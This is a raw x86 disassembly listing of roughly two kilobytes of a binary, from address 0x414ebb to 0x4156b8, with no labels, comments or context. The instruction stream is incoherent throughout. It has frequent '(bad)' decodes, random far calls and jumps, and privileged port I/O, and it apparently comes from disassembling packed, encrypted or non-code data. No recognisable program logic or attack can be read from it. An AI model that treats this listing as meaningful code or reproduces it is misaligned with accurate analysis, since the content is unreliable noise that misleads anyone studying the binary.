  414ebb:	jne    0x414ef3
  414ebd:	div    dh
  414ebf:	mov    bl,0x88
  414ec1:	or     ah,BYTE PTR [edx+0x17965f28]
  414ec7:	dec    edi
  414ec8:	ret    
  414ec9:	push   ebp
  414eca:	clc    
  414ecb:	popa   
  414ecc:	jbe    0x414ede
  414ece:	lds    edx,FWORD PTR [edx-0x1a23d08d]
  414ed4:	std    
  414ed5:	sbb    al,0x2f
  414ed7:	add    ch,BYTE PTR [ebx-0x42]
  414eda:	or     BYTE PTR [edx],al
  414edc:	push   eax
  414edd:	jno    0x414ec5
  414edf:	nop
  414ee0:	ror    esi,1
  414ee2:	and    eax,0xc46c507f
  414ee7:	pop    esi
  414ee8:	sbb    ebp,DWORD PTR [ebx+eiz*8]
  414eeb:	loopne 0x414eb2
  414eed:	(bad)  
  414eee:	fisub  DWORD PTR ds:0xc722b5f5
  414ef4:	call   0x46a0:0x1466f491
  414efb:	call   0x8044ba6b
  414f00:	sub    ah,BYTE PTR [ecx+0x4f]
  414f03:	sar    esi,cl
  414f05:	(bad)  
  414f06:	cmp    BYTE PTR [ebp+0x36],ch
  414f09:	add    eax,0x8568754b
  414f0e:	out    dx,al
  414f0f:	fidiv  WORD PTR [eax+eiz*1]
  414f12:	mov    bl,0x68
  414f14:	dec    esi
  414f15:	dec    edi
  414f16:	push   es
  414f17:	call   0x912b70d7
  414f1c:	dec    eax
  414f1d:	(bad)  
  414f1e:	mov    DWORD PTR [ecx+0x30],esp
  414f21:	fsub   st(4),st
  414f23:	mov    eax,ds:0x84de7e94
  414f28:	xor    ebp,edi
  414f2a:	pop    ebx
  414f2b:	adc    esi,DWORD PTR [ecx]
  414f2d:	bound  esp,QWORD PTR [ecx-0x6]
  414f30:	daa    
  414f31:	push   esi
  414f32:	adc    al,0x21
  414f34:	int3   
  414f35:	cwde   
  414f36:	adc    DWORD PTR [edx-0x2],edi
  414f39:	pop    ebx
  414f3a:	ficomp DWORD PTR [ecx]
  414f3c:	mov    eax,0xd6d61098
  414f41:	push   es
  414f42:	mov    ds:0x4dafc066,eax
  414f47:	jmp    0x414f1e
  414f49:	xchg   esi,eax
  414f4a:	data16 test BYTE PTR ds:0x436ddbf1,0xe2
  414f52:	adc    ecx,edx
  414f54:	ja     0x414f0e
  414f56:	loop   0x414ed9
  414f58:	outs   dx,DWORD PTR ds:[esi]
  414f59:	lods   al,BYTE PTR ds:[esi]
  414f5a:	xor    al,BYTE PTR [ebp+0x747f3490]
  414f60:	out    dx,eax
  414f61:	mov    cl,BYTE PTR [eax-0x433121ba]
  414f67:	add    DWORD PTR [edx+0x7e3dfa2c],esp
  414f6d:	push   cs
  414f6e:	dec    esi
  414f6f:	adc    al,0x72
  414f71:	sbb    esp,DWORD PTR [ebx-0x74865c0]
  414f77:	adc    BYTE PTR [edx+0x29b7b986],dh
  414f7d:	scas   al,BYTE PTR es:[edi]
  414f7e:	jecxz  0x414f68
  414f80:	loopne 0x414fac
  414f82:	add    al,0xa2
  414f84:	fs clc 
  414f86:	jg     0x414f78
  414f88:	into   
  414f89:	or     al,0xd5
  414f8b:	sbb    edx,DWORD PTR [edx-0x7e273a31]
  414f91:	inc    esp
  414f92:	es cs nop
  414f95:	or     DWORD PTR [edx+0x5e656362],0x55a61839
  414f9f:	jb     0x414fbe
  414fa1:	jae    0x415022
  414fa3:	mov    ecx,0x15a82c41
  414fa8:	mov    dl,BYTE PTR [edx]
  414faa:	pop    ebx
  414fab:	xor    eax,0x43e7e26
  414fb0:	push   cs
  414fb1:	int    0x85
  414fb3:	in     eax,dx
  414fb4:	clc    
  414fb5:	imul   ebx,DWORD PTR [edx-0x361a7a13],0x15
  414fbc:	push   ss
  414fbd:	pop    ecx
  414fbe:	scas   eax,DWORD PTR es:[edi]
  414fbf:	lds    esi,FWORD PTR [edx-0x25]
  414fc2:	lahf   
  414fc3:	mov    ch,0x5c
  414fc5:	jmp    DWORD PTR [ecx]
  414fc7:	out    dx,eax
  414fc8:	pop    eax
  414fc9:	dec    dl
  414fcb:	mov    ebp,0xe80b9009
  414fd0:	inc    edi
  414fd1:	jbe    0x414fb4
  414fd3:	std    
  414fd4:	call   0x84286722
  414fd9:	adc    dl,BYTE PTR [edi]
  414fdb:	rol    DWORD PTR [ebp+0x63],1
  414fde:	inc    esp
  414fdf:	fs pop ebx
  414fe1:	or     al,0x57
  414fe3:	cli    
  414fe4:	jbe    0x415007
  414fe6:	pop    ss
  414fe7:	bound  esi,QWORD PTR [esi-0x445ccce]
  414fed:	addr16 das 
  414fef:	scas   al,BYTE PTR es:[edi]
  414ff0:	or     dl,BYTE PTR [edx]
  414ff2:	sub    cl,BYTE PTR [edi]
  414ff4:	stos   BYTE PTR es:[edi],al
  414ff5:	mov    ebp,0x23fce6d4
  414ffa:	mov    dl,BYTE PTR [ebx+0x4d63f06]
  415000:	pop    esp
  415001:	das    
  415002:	or     BYTE PTR [edi+0xf14af8],ch
  415008:	shl    BYTE PTR [edi+0x37feaffc],1
  41500e:	pop    ebp
  41500f:	sbb    esp,0x4f693b8d
  415015:	in     eax,0xde
  415017:	add    esp,DWORD PTR [ecx]
  415019:	sub    DWORD PTR [edx+ebp*1+0x2364bd86],0xb
  415021:	in     al,dx
  415022:	mov    eax,0x135b34af
  415027:	out    dx,eax
  415028:	rol    esp,0xc5
  41502b:	jp     0x415071
  41502d:	dec    edx
  41502e:	scas   eax,DWORD PTR es:[edi]
  41502f:	test   BYTE PTR [edx+ebp*8+0x75d578c5],bh
  415036:	push   edx
  415037:	je     0x4150b3
  415039:	fst    DWORD PTR [ecx+ebx*8]
  41503c:	push   es
  41503d:	loopne 0x414fcc
  41503f:	jmp    0x6a37acf6
  415044:	mov    edx,0x21b23de3
  415049:	dec    ecx
  41504a:	fcmovb st,st(2)
  41504c:	adc    esi,eax
  41504e:	mov    ecx,0x90598198
  415053:	je     0x4150b0
  415055:	or     BYTE PTR [ebx+0x1d35f838],ah
  41505b:	paddsb mm3,QWORD PTR [eax+0x34]
  41505f:	enter  0x3c3e,0x7d
  415063:	cmp    al,0x2a
  415065:	pop    ebp
  415066:	mov    al,ds:0xb4b67f98
  41506b:	mov    esi,0x79499d6d
  415070:	in     eax,dx
  415071:	arpl   WORD PTR gs:[edx-0x18],sp
  415075:	mov    esp,0x15fb50fa
  41507a:	jb     0x4150a0
  41507c:	mov    al,0x88
  41507e:	xchg   BYTE PTR [ebp+0x1f4187f1],dh
  415084:	je     0x4150c1
  415086:	scas   eax,DWORD PTR es:[edi]
  415087:	(bad)  
  415088:	push   edi
  415089:	jle    0x415085
  41508b:	into   
  41508c:	les    esp,FWORD PTR [edi-0x73]
  41508f:	or     cl,bh
  415091:	in     al,0x9a
  415093:	push   ss
  415094:	fs scas al,BYTE PTR es:[edi]
  415096:	push   edi
  415097:	push   esp
  415098:	cmp    BYTE PTR [eax+0x40],cl
  41509b:	sub    ebp,DWORD PTR [ebx]
  41509d:	iret   
  41509e:	cmc    
  41509f:	jbe    0x4150a1
  4150a1:	sar    ebx,1
  4150a3:	(bad)  
  4150a4:	jle    0x4150ff
  4150a6:	mov    ds:0x88cc7ef6,eax
  4150ab:	fstp   TBYTE PTR [esi+edx*4-0x3f650954]
  4150b2:	test   eax,0x616b8ddf
  4150b7:	xchg   ecx,eax
  4150b8:	or     BYTE PTR [ecx+0x242bfa91],dl
  4150be:	jb     0x415069
  4150c0:	sbb    ah,BYTE PTR [eax+0x75244db0]
  4150c6:	jnp    0x415084
  4150c8:	ds jb  0x4150c5
  4150cb:	pusha  
  4150cc:	and    BYTE PTR [eax],dl
  4150ce:	cli    
  4150cf:	leave  
  4150d0:	add    al,0x7a
  4150d2:	ret    0x4ac7
  4150d5:	imul   edi,DWORD PTR [ebx-0x6ba33895],0xffffffd4
  4150dc:	rcl    DWORD PTR [edi+0x10],1
  4150df:	fisubr DWORD PTR [edi+edi*8-0x35f58d5c]
  4150e6:	jp     0x415139
  4150e8:	mov    esi,DWORD PTR [edx+edx*1+0x65]
  4150ec:	shr    edx,1
  4150ee:	repz push esp
  4150f0:	jne    0x4150f0
  4150f2:	dec    ebp
  4150f3:	pop    edi
  4150f4:	or     dh,0xc8
  4150f7:	pop    edi
  4150f8:	sbb    al,0x7b
  4150fa:	jg     0x415174
  4150fc:	popa   
  4150fd:	repnz or DWORD PTR [esi],ebp
  415100:	mov    bl,0x5b
  415102:	sti    
  415103:	fistp  DWORD PTR [esi-0x8]
  415106:	cdq    
  415107:	inc    esi
  415108:	(bad)  
  415109:	retf   0x34ce
  41510c:	daa    
  41510d:	shl    BYTE PTR [esp+eiz*4+0x18],cl
  415111:	out    0x8a,al
  415113:	mov    dh,0xa1
  415115:	loopne 0x4150d3
  415117:	ins    DWORD PTR es:[di],dx
  415119:	sub    eax,0x57feee2a
  41511e:	nop
  41511f:	mov    dh,bh
  415121:	test   al,0x2f
  415123:	imul   DWORD PTR [eax+esi*4+0x29e10595]
  41512a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41512b:	cwde   
  41512c:	xor    al,BYTE PTR [ebp-0x73]
  41512f:	dec    edx
  415130:	stc    
  415131:	arpl   WORD PTR [eax+0x13d7f2b4],bp
  415137:	and    ch,BYTE PTR [ecx+eiz*1-0x2a5e92a1]
  41513e:	jecxz  0x415193
  415140:	punpckhwd mm3,QWORD PTR [edx-0x48]
  415144:	icebp  
  415145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415146:	mov    bl,0xf3
  415148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415149:	imul   eax,esi,0xffffffa3
  41514c:	push   0xffffffb5
  41514e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41514f:	int    0x48
  415151:	cmp    esi,DWORD PTR [eax]
  415153:	fistp  QWORD PTR [ebp+0xb]
  415156:	sub    edi,DWORD PTR [edi]
  415158:	rol    DWORD PTR [edi+0x725f7f52],1
  41515e:	repnz mov al,0xa3
  415161:	call   0xb381c666
  415166:	jl     0x4151a7
  415168:	jg     0x4151ae
  41516a:	and    cl,bh
  41516c:	mov    eax,0xf955c4e4
  415171:	das    
  415172:	iret   
  415173:	mov    ds:0x3de2cb61,al
  415178:	xchg   ebp,eax
  415179:	mov    ebx,0x77279c80
  41517e:	sbb    al,0x94
  415180:	add    edx,esi
  415182:	retf   
  415183:	sbb    ah,BYTE PTR [ecx+0x1d390968]
  415189:	sub    dh,dh
  41518b:	jne    0x4151b2
  41518d:	ror    BYTE PTR [ebx-0x6d],cl
  415190:	in     eax,dx
  415191:	fwait
  415192:	jo     0x41513f
  415194:	scas   al,BYTE PTR es:[edi]
  415195:	dec    ebp
  415196:	or     DWORD PTR [ebx+0x10],ebx
  415199:	inc    ebx
  41519a:	stc    
  41519b:	ss pop es
  41519d:	je     0x41516f
  41519f:	mov    ah,0x4c
  4151a1:	push   ecx
  4151a2:	fisubr DWORD PTR [ebx+0x1c8c2f96]
  4151a8:	push   eax
  4151a9:	mov    esi,0x3ebfb750
  4151ae:	add    eax,0x24224b87
  4151b3:	mov    ds:0x59eabcd6,eax
  4151b8:	mov    esp,0xdea42504
  4151bd:	test   al,0x24
  4151bf:	pop    edi
  4151c0:	inc    edi
  4151c1:	(bad)
  4151c4:	fiadd  WORD PTR [esi-0x2]
  4151c7:	sbb    bh,BYTE PTR ds:0xcb02c112
  4151cd:	gs inc edx
  4151cf:	ins    DWORD PTR es:[edi],dx
  4151d0:	loope  0x415158
  4151d2:	mov    bl,0x1
  4151d4:	xchg   esi,eax
  4151d5:	dec    ebp
  4151d6:	aas    
  4151d7:	aas    
  4151d8:	pushf  
  4151d9:	out    0xb4,eax
  4151db:	add    bh,bh
  4151dd:	clc    
  4151de:	out    0xc1,al
  4151e0:	xor    esi,DWORD PTR [esi+edi*1+0x4bfef3bc]
  4151e7:	je     0x415262
  4151e9:	(bad)  
  4151ea:	pop    ecx
  4151eb:	pop    ds
  4151ec:	xchg   edi,eax
  4151ed:	pop    ecx
  4151ee:	pop    ds
  4151ef:	add    al,0x4f
  4151f1:	xchg   esi,eax
  4151f2:	call   DWORD PTR [esi]
  4151f4:	mov    ebp,0x11369ff0
  4151f9:	cmp    ch,dh
  4151fb:	push   eax
  4151fc:	cli    
  4151fd:	mov    WORD PTR [ecx-0x17],?
  415200:	inc    edx
  415201:	out    dx,al
  415202:	outs   dx,BYTE PTR ds:[esi]
  415203:	jmp    0x4151b3
  415205:	mov    cl,0x20
  415207:	test   eax,0xb804180f
  41520c:	sbb    eax,0xbc96276
  415211:	jmp    0x19bf:0x50702244
  415218:	fimul  DWORD PTR [ebp-0x4b9afd1b]
  41521e:	clc    
  41521f:	mov    al,ds:0x40a7e329
  415224:	lea    esp,[edi+edx*4]
  415227:	xor    al,0x81
  415229:	jo     0x41527f
  41522b:	sbb    al,0x75
  41522d:	sbb    eax,esp
  41522f:	xchg   ebp,eax
  415230:	(bad)  
  415233:	retf   0xbce0
  415236:	ds jbe 0x4151d7
  415239:	sub    eax,0xc2986532
  41523e:	mov    ch,0xbe
  415240:	mov    edx,0x47364149
  415245:	cmp    eax,0xe29fd745
  41524a:	add    al,cl
  41524c:	mov    ch,0xae
  41524e:	xor    al,0x4c
  415250:	adc    BYTE PTR [edi],bh
  415252:	loopne 0x4152bd
  415254:	out    0x3f,eax
  415256:	inc    edi
  415257:	mul    ecx
  415259:	pushf  
  41525a:	shr    DWORD PTR [esi],0x3b
  41525d:	sub    bh,BYTE PTR [edx+eiz*2]
  415260:	xlat   BYTE PTR ds:[ebx]
  415261:	lods   eax,DWORD PTR ds:[si]
  415263:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415264:	mov    edx,0xf2b1ad53
  415269:	inc    edx
  41526a:	inc    esp
  41526b:	push   0xd2141444
  415270:	ret    
  415271:	xchg   DWORD PTR ds:[ebx-0x4d92a1d1],ecx
  415278:	adc    al,BYTE PTR [esi]
  41527a:	loop   0x4152f0
  41527c:	sahf   
  41527d:	xchg   BYTE PTR [ecx],ch
  41527f:	push   esi
  415280:	mov    ch,0x8
  415282:	add    bh,bl
  415284:	pop    eax
  415285:	push   ds
  415286:	rcl    DWORD PTR [ebx],0x81
  415289:	sahf   
  41528a:	jae    0x41527b
  41528c:	lods   al,BYTE PTR ds:[esi]
  41528d:	punpcklwd mm2,mm6
  415290:	or     al,0x19
  415292:	jb     0x4152e4
  415294:	call   0xd8b3:0x2a730ca1
  41529b:	push   esi
  41529c:	cwde   
  41529d:	mov    esp,0xb68e331f
  4152a2:	aad    0xfa
  4152a4:	(bad)  
  4152a5:	and    al,0x7
  4152a7:	sub    BYTE PTR [edi-0x76],ah
  4152aa:	pop    ss
  4152ab:	in     al,0xa3
  4152ad:	sub    BYTE PTR [esi],cl
  4152af:	mov    edi,0x3ab79635
  4152b4:	cmp    eax,0x73c73b33
  4152b9:	enter  0xad47,0xac
  4152bd:	mov    edx,0x36e405c3
  4152c2:	mov    esp,0x455fab5f
  4152c7:	fsubr  DWORD PTR [edi]
  4152c9:	mov    eax,0xb7e4cac0
  4152ce:	xor    eax,0xc6a922aa
  4152d3:	lock dec edi
  4152d5:	fsub   QWORD PTR [eax-0x660d2e49]
  4152db:	xlat   BYTE PTR ds:[ebx]
  4152dc:	fidiv  DWORD PTR [esi+0x128b5578]
  4152e2:	dec    ebp
  4152e3:	and    al,0x2c
  4152e5:	xchg   ebx,eax
  4152e6:	cwde   
  4152e7:	and    ebx,DWORD PTR [ebx-0x22]
  4152ea:	mov    dh,0x54
  4152ec:	cld    
  4152ed:	pop    ebx
  4152ee:	cli    
  4152ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4152f0:	push   esp
  4152f1:	and    DWORD PTR [ebx+0x4e],ebp
  4152f4:	lahf   
  4152f5:	or     BYTE PTR [edx+0x19],bl
  4152f8:	xchg   ebx,eax
  4152f9:	sub    dl,bh
  4152fb:	fwait
  4152fc:	push   ebp
  4152fd:	xor    BYTE PTR [ecx-0x4ceca834],bh
  415303:	dec    ebp
  415304:	sbb    ah,BYTE PTR [eax+0x48]
  415307:	dec    esp
  415308:	xchg   ebp,eax
  415309:	ror    BYTE PTR [edi-0x3d4a3959],1
  41530f:	mov    ch,0xb1
  415311:	mov    bl,BYTE PTR [edi+0x78]
  415314:	xor    ah,BYTE PTR [esi]
  415316:	dec    ebx
  415317:	add    DWORD PTR ss:[eax+0xa],eax
  41531b:	or     eax,0x66164cb8
  415320:	sbb    edx,DWORD PTR [edi+edi*2]
  415323:	loop   0x41534b
  415325:	mov    al,0x1
  415327:	(bad)  
  415328:	int3   
  415329:	cmp    ch,BYTE PTR [edx-0x3f]
  41532c:	and    BYTE PTR [ecx-0x40],0x41
  415330:	fisttp DWORD PTR [esi+0x7eaf7017]
  415336:	xor    ah,dl
  415338:	rol    DWORD PTR [ebx+0x704d9dcf],cl
  41533e:	pop    es
  41533f:	mov    edx,0x5e861318
  415344:	ins    DWORD PTR es:[edi],dx
  415345:	out    dx,eax
  415346:	call   0xe4e19213
  41534b:	(bad)  
  41534c:	push   cs
  41534d:	and    esp,edx
  41534f:	adc    DWORD PTR [eax],ebp
  415351:	sub    DWORD PTR [esi],esi
  415353:	xor    DWORD PTR [edx+0x4d091105],0xcf644be9
  41535d:	sahf   
  41535e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41535f:	and    ecx,DWORD PTR [ecx-0x59986315]
  415365:	dec    edx
  415366:	ret    0xdafb
  415369:	ficomp WORD PTR [edi]
  41536b:	ins    DWORD PTR es:[edi],dx
  41536c:	adc    esi,edi
  41536e:	pop    ebp
  41536f:	clc    
  415370:	push   eax
  415371:	mul    BYTE PTR [edx]
  415373:	and    esp,DWORD PTR [edx-0x14]
  415376:	imul   edi,DWORD PTR [edx],0xfffffffe
  415379:	push   cs
  41537a:	push   ebx
  41537b:	mov    dh,0xe3
  41537d:	sub    esi,esi
  41537f:	adc    BYTE PTR [ecx-0x53],al
  415382:	call   0x37a5379d
  415387:	test   BYTE PTR [ecx],0x9
  41538a:	aas    
  41538b:	xor    al,0x6c
  41538d:	ss xchg esp,eax
  41538f:	pop    es
  415390:	jmp    0x415332
  415392:	in     al,0x96
  415394:	dec    esp
  415395:	mov    eax,0x4d723ee5
  41539a:	clc    
  41539b:	and    al,0x6a
  41539d:	icebp  
  41539e:	shl    DWORD PTR ds:0x8781d2a0,0x19
  4153a5:	add    bl,BYTE PTR [esi-0x6f]
  4153a8:	cmp    eax,0xb04da8be
  4153ad:	push   edi
  4153ae:	icebp  
  4153af:	mov    al,ds:0xcb5ac90d
  4153b4:	fs sub esp,DWORD PTR es:[ebx+0x36]
  4153b9:	pop    ss
  4153ba:	sbb    BYTE PTR [ecx+0x7b3d922a],bl
  4153c0:	push   ebp
  4153c1:	adc    edx,ebx
  4153c3:	mov    dl,0x2c
  4153c5:	cdq    
  4153c6:	sub    bh,dh
  4153c8:	pop    es
  4153c9:	(bad)  
  4153ca:	mov    ebx,ss
  4153cc:	cmp    DWORD PTR [ebx-0x79ec398c],ebp
  4153d2:	cli    
  4153d3:	inc    eax
  4153d4:	aad    0x73
  4153d6:	sti    
  4153d7:	idiv   BYTE PTR [eax]
  4153d9:	jnp    0x415434
  4153db:	xchg   BYTE PTR [ecx+0x77],ah
  4153de:	into   
  4153df:	test   DWORD PTR [eax+eax*4],ebx
  4153e2:	or     eax,0xd40545fd
  4153e7:	stos   DWORD PTR es:[edi],eax
  4153e8:	retf   0x8f43
  4153eb:	push   DWORD PTR [eax-0x4]
  4153ee:	inc    edx
  4153ef:	jmp    0xc3b1dd84
  4153f4:	or     eax,0xf7ce4fed
  4153f9:	stos   BYTE PTR es:[edi],al
  4153fa:	retf   0x574e
  4153fd:	std    
  4153fe:	popa   
  4153ff:	dec    esp
  415400:	leave  
  415401:	idiv   ebx
  415403:	pop    ss
  415404:	pop    esi
  415405:	(bad)  
  415406:	or     DWORD PTR [ecx+0x68],edi
  415409:	sub    al,0xd3
  41540b:	push   ss
  41540c:	push   edx
  41540d:	pop    ecx
  41540e:	add    al,0x28
  415410:	xchg   esp,eax
  415411:	stc    
  415412:	mov    esp,0xa8b6a105
  415417:	add    bl,0x4c
  41541a:	jno    0x415423
  41541c:	fdiv   st(7),st
  41541e:	iret   
  41541f:	lods   al,BYTE PTR ds:[esi]
  415420:	out    dx,eax
  415421:	(bad)  [esi]
  415423:	push   DWORD PTR [esi+esi*8+0x2d]
  415427:	les    edx,FWORD PTR [esi-0x7a]
  41542a:	or     eax,0xd5f2a8ce
  41542f:	or     eax,0xca69a8a8
  415434:	lock mov ebp,0xbf3886a9
  41543a:	pop    ebx
  41543b:	xor    eax,0x4741e57d
  415440:	cmp    al,0x7
  415442:	ss imul ebx,ebx,0x76
  415446:	push   es
  415447:	lods   al,BYTE PTR ds:[esi]
  415448:	loopne 0x415420
  41544a:	(bad)  
  41544b:	stc    
  41544c:	add    DWORD PTR [ebp-0x3d],ebx
  41544f:	das    
  415450:	adc    BYTE PTR [edx+0x5d1c3dc4],dh
  415456:	push   0xd3bce84a
  41545b:	dec    ebx
  41545c:	stos   BYTE PTR es:[edi],al
  41545d:	pop    es
  41545e:	popf   
  41545f:	jnp    0x415476
  415461:	adc    al,0xfd
  415463:	in     al,dx
  415464:	xchg   ebp,eax
  415465:	sub    eax,ebx
  415467:	or     bl,bh
  415469:	pop    ebp
  41546a:	outs   dx,BYTE PTR ds:[esi]
  41546b:	fs cs sbb eax,0x69e3db4d
  415472:	or     eax,0x215b9efe
  415477:	jnp    0x4153fd
  415479:	mov    esp,0xba6a09cb
  41547e:	or     esp,DWORD PTR cs:[edi+0x79]
  415482:	jne    0x4154b7
  415484:	adc    edi,esp
  415486:	cmp    al,0x3e
  415488:	inc    ebx
  415489:	scas   al,BYTE PTR es:[edi]
  41548a:	xchg   edi,eax
  41548b:	inc    edi
  41548c:	lods   al,BYTE PTR ds:[esi]
  41548d:	test   BYTE PTR [ecx-0x37],cl
  415490:	stc    
  415491:	call   0x560b83e6
  415496:	or     eax,0x1d3aaab8
  41549b:	mov    ah,BYTE PTR [edx*8+0x66259491]
  4154a2:	jns    0x415440
  4154a4:	inc    ecx
  4154a5:	sub    edi,DWORD PTR [esi+0x44]
  4154a8:	pop    ss
  4154a9:	adc    eax,0xd52636f1
  4154ae:	inc    eax
  4154af:	cdq    
  4154b0:	ins    DWORD PTR es:[edi],dx
  4154b1:	pop    edi
  4154b2:	adc    ch,BYTE PTR [edi+ecx*8]
  4154b5:	out    dx,eax
  4154b6:	das    
  4154b7:	ins    DWORD PTR es:[edi],dx
  4154b8:	jne    0x4154be
  4154ba:	and    DWORD PTR [ebx+0x1],edi
  4154bd:	or     edx,DWORD PTR ds:0x1d778ea9
  4154c3:	push   ecx
  4154c4:	pop    esp
  4154c6:	mov    ebp,0x79860cd0
  4154cb:	sub    esp,ebp
  4154cd:	shl    DWORD PTR [ebp+0x5664bb70],1
  4154d3:	gs ss ds xchg ebx,eax
  4154d7:	jecxz  0x41550d
  4154d9:	mov    al,0x47
  4154db:	push   ecx
  4154dc:	aaa    
  4154dd:	mov    edx,0x46366419
  4154e2:	in     al,0xe6
  4154e4:	mov    ecx,0x728a6d1c
  4154e9:	pop    ebx
  4154ea:	inc    ebx
  4154eb:	xchg   esi,eax
  4154ec:	ja     0x4154d2
  4154ee:	int    0x92
  4154f0:	pop    ecx
  4154f1:	lods   eax,DWORD PTR ds:[esi]
  4154f2:	mov    esp,0x9b49db98
  4154f7:	pop    edx
  4154f8:	mov    ah,0xd3
  4154fa:	scas   al,BYTE PTR es:[edi]
  4154fb:	xchg   edx,eax
  4154fc:	inc    ebp
  4154fd:	lds    ebx,FWORD PTR [ecx-0x5d]
  415500:	xchg   esi,eax
  415501:	mov    ds:0x21492848,al
  415506:	push   esp
  415507:	jg     0x4154b6
  415509:	mov    ds,WORD PTR [ecx+0x5af57d41]
  41550f:	lahf   
  415510:	push   ds
  415511:	stc    
  415512:	add    DWORD PTR [ebp-0xba13230],esi
  415518:	lods   eax,DWORD PTR ds:[esi]
  415519:	(bad)  
  41551a:	xor    eax,0xd10f041
  41551f:	push   ecx
  415520:	das    
  415521:	retf   0x46a8
  415524:	rcr    ebx,0xb9
  415527:	leave  
  415528:	into   
  415529:	lock mov eax,ds:0x2794788a
  41552f:	sub    eax,0xb449e515
  415534:	and    eax,0xec9f67ed
  415539:	ss mov ecx,0xbf0b95ae
  41553f:	ss add cl,al
  415542:	xchg   ebx,eax
  415543:	pop    edx
  415544:	lahf   
  415545:	xor    DWORD PTR [edx-0x4f],0xf2e3c70a
  41554c:	sub    dl,ah
  41554e:	or     al,0x83
  415550:	pop    ecx
  415551:	mov    cl,ah
  415553:	xor    al,0x6f
  415555:	test   DWORD PTR [edi],esp
  415557:	cmc    
  415558:	popf   
  415559:	call   0x83c:0x1131f57a
  415560:	repnz xor DWORD PTR [esi+0x242aad9e],ebx
  415567:	mov    bh,0xd1
  415569:	test   BYTE PTR [ebp+0x34],ah
  41556c:	popf   
  41556d:	mov    ah,0x48
  41556f:	sub    edi,esi
  415571:	mov    eax,esi
  415573:	popa   
  415574:	lock (bad) 
  415576:	adc    ecx,DWORD PTR [ebp+ecx*2-0x7b]
  41557a:	loop   0x41553d
  41557c:	sti    
  41557d:	pop    eax
  41557e:	lea    edi,[esi]
  415580:	sti    
  415581:	jns    0x4155df
  415583:	inc    ecx
  415584:	bound  edx,QWORD PTR [esi+0x62a2b547]
  41558a:	dec    edi
  41558b:	sub    esi,eax
  41558d:	call   0x6eef52aa
  415592:	hlt    
  415593:	or     dl,BYTE PTR [eax-0x583f033]
  415599:	ss jae 0x415557
  41559c:	mov    al,ds:0x6014df87
  4155a1:	scas   eax,DWORD PTR es:[edi]
  4155a2:	mov    al,0xf0
  4155a4:	dec    edi
  4155a5:	addr16 mov bl,0x57
  4155a8:	mov    edi,ebx
  4155aa:	and    ah,BYTE PTR [ecx]
  4155ac:	sbb    edx,DWORD PTR [edx]
  4155ae:	test   BYTE PTR [ecx+0x151cd651],bh
  4155b4:	add    edi,ebx
  4155b6:	mov    edi,0x1ff6521f
  4155bb:	call   0xd3dc:0xdcb0c2ab
  4155c2:	inc    ebp
  4155c3:	sub    edi,edi
  4155c5:	sahf   
  4155c6:	sbb    DWORD PTR [edi-0x1e],edi
  4155c9:	jns    0x41556f
  4155cb:	mov    ah,0x20
  4155cd:	popa   
  4155ce:	popf   
  4155cf:	fst    st(5)
  4155d1:	test   BYTE PTR [esi+edi*2],bl
  4155d4:	add    eax,0xd48f2545
  4155d9:	inc    eax
  4155da:	cmc    
  4155db:	mov    ah,0x74
  4155dd:	popa   
  4155de:	lds    ecx,FWORD PTR [ebx+0x17]
  4155e1:	mov    ebx,0x4961ade6
  4155e6:	fisub  WORD PTR [eax+0x6961b6b]
  4155ec:	mov    esp,0xf3ea3298
  4155f1:	ret    0x736a
  4155f4:	mov    bh,0xc8
  4155f6:	int3   
  4155f7:	pop    eax
  4155f8:	fwait
  4155f9:	test   BYTE PTR [ebx-0x1de2a455],cl
  4155ff:	test   BYTE PTR [ecx],ch
  415601:	loope  0x415643
  415603:	rol    BYTE PTR [edi],1
  415605:	hlt    
  415606:	std    
  415607:	repnz xchg ebp,eax
  415609:	mov    ?,WORD PTR [eax-0x17238daa]
  41560f:	popf   
  415610:	cmovnp esp,ebx
  415613:	shr    DWORD PTR [edx+0x26],0x50
  415617:	push   edx
  415618:	imul   esi,DWORD PTR [ebp-0x3aef8b42],0xa
  41561f:	xchg   esp,eax
  415620:	xchg   ebx,eax
  415621:	lods   ax,WORD PTR ds:[esi]
  415623:	in     al,0xaf
  415625:	mov    ebx,0x6717bd83
  41562a:	out    dx,eax
  41562b:	dec    eax
  41562c:	mov    DWORD PTR [edx-0x49d5c058],esi
  415632:	int3   
  415633:	dec    edi
  415634:	push   0x24d04550
  415639:	mov    ah,0x24
  41563b:	sahf   
  41563c:	xchg   edx,eax
  41563d:	(bad)
  415642:	cmp    eax,0xf91e9581
  415647:	mov    dl,0x64
  415649:	in     eax,dx
  41564a:	mov    ss,eax
  41564c:	stc    
  41564d:	jge    0x4156cd
  41564f:	mov    ds:0x2a8f898d,al
  415654:	push   ebp
  415655:	and    al,0x13
  415657:	mov    al,0x69
  415659:	xor    al,dh
  41565b:	mov    esp,0x6423f67f
  415660:	push   es
  415661:	xchg   ebp,eax
  415662:	ds sbb eax,0x87529073
  415668:	dec    esp
  415669:	ret    0xfa28
  41566c:	cmp    al,cl
  41566e:	clc    
  41566f:	les    eax,FWORD PTR [ecx+edi*2-0x30]
  415673:	out    0x46,eax
  415675:	neg    DWORD PTR [ebx+edx*1-0x504b0632]
  41567c:	scas   al,BYTE PTR es:[edi]
  41567d:	pop    esp
  41567e:	cmp    DWORD PTR [esi+0x7e99cdab],ebp
  415684:	imul   DWORD PTR [edi]
  415686:	leave  
  415687:	pop    eax
  415688:	xchg   edx,eax
  415689:	popf   
  41568a:	(bad)
  41568e:	sti    
  41568f:	cmp    DWORD PTR [ebx+ecx*1+0x622016ba],esi
  415696:	fdiv   DWORD PTR [eax+0x5ca2ebca]
  41569c:	pop    esp
  41569d:	cmp    edi,DWORD PTR [ecx+0x39]
  4156a0:	bound  eax,QWORD PTR [edx]
  4156a2:	popf   
  4156a3:	shl    DWORD PTR [edi],0xd6
  4156a6:	mov    dh,0x51
  4156a8:	sub    ecx,esi
  4156aa:	push   ds
  4156ab:	mov    dh,0xa3
  4156ad:	sub    al,0x13
  4156af:	xchg   edx,eax
  4156b0:	xor    al,0x72
  4156b2:	push   ds
  4156b3:	cs test al,0xf1
  4156b6:	pop    esi
  4156b7:	(bad)  
  4156b8:	les    esp,FWORD PTR [ecx+ecx*1+0x67]
